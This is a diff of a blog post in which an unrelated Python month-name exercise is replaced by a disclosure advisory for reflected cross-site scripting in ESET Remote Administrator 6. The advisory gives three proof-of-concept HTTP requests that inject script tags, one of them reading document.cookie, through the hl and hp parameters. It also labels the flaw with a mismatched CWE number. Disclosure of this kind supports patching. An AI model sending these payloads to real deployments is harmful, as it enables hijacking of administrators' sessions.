@@ -5,44 +5,56 @@ date:   2019-01-21 03:43:45 +0700
 categories: [cves]
 ---
 
-Map the given integer to a month.
+Vendor: ESET, LLC, d/b/a ESET North America
+Product: ESET Remote Administrator
+Version affected: 6
 
-**Example:**
+#### Product description:
+ESET Remote Administrator allows to oversee the entire network, including workstations, servers and smartphones from a single point. It can be installed on Windows as well as Linux servers and also comes as a Virtual Appliance. It handles
+communication with agents, and collects and stores application data in the database.
 
-* For `mo = 1`, the output should be `getMonthName(mo) = "Jan"`,
-* For `mo = 0`, the output should be `getMonthName(mo) = "invalid month"`.
+#### Cross-Site Scripting, Reflected
+CVE: CVE-2019-xxxx
+CWE: CWE-200
 
-**Input/Output**
 
-* [time limit] 4000ms (py)
-* [input] integer mo (A non-negative integer).
-* **Constraints:** `0 ≤ mo ≤ 15`.
-* **[output] string**
+A Cross Site Scripting vulnerability exists in ESET Remote Administrator hl, hp parameters. It is possible to inject arbitrary JavaScript into requests which are ultimately executed by the user browser.
 
-A `3`-letter abbreviation of month number `mo` or `"invalid month"` if the month doesn't exist.
 
-Here are abbreviations of all months:
+## Proof of Concept 1
+{% highlight ruby %}
+GET /era/webconsole/getHelp?hl=en-US&hp=fs_login_screen.htm"/><script>alert(document.cookie)</script> HTTP/1.1
+Accept: */*
+Accept-Language: en-US
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Host: a.b.c.d
+Connection: Keep-Alive
+Cookie: JSESSIONID=02EB9FB09F74291DF91AE98411F9ECAF
+{% endhighlight %}
 
-**My Solution:**
+## Proof of Concept 2
+{% highlight ruby %}
+GET /era/webconsole/getHelp?hl=en-US"/><script>alert('xss')</script>&hp=fs_login_screen.htm HTTP/1.1
+Accept: */*
+Accept-Language: en-US
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Host: a.b.c.d
+Connection: Keep-Alive
+Cookie: JSESSIONID=02EB9FB09F74291DF91AE98411F9ECAF
+{% endhighlight %}
 
-```python
-def getMonthName(mo):
-    months = {
-        1: "Jan", 2: "Feb", 3: "Mar", 4:"Apr", 
-        5: "May", 6: "Jun", 7: "Jul", 8:"Aug", 
-        9: "Sep", 10: "Oct", 11: "Nov", 12: "Dec"
-    }
-    if mo in months.keys():
-        return months.get(mo)
-    return "invalid month"
-```
+## Proof of Concept 3
+{% highlight ruby %}
+GET /era/webconsole/getHelp?hl="><script>alert('xss')</script> HTTP/1.1
+Accept: */*
+Accept-Language: en-US
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Host: a.b.c.d
+Connection: Keep-Alive
+Cookie: JSESSIONID=02EB9FB09F74291DF91AE98411F9ECAF
+{% endhighlight %}
 
-**Result Tests**:
-
-```python
->>> getMonthName(1)
-"Jan"
->>> getMonthName(0)
-"invalid month"
->>>
-```
+#### References:
+1. OWASP - https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+2. https://www.eset.com/au/business/remote-management/remote-administrator/
+3. Download the latest trial version - https://support.eset.com/kb6114/?locale=en_US&viewlocale=en_US
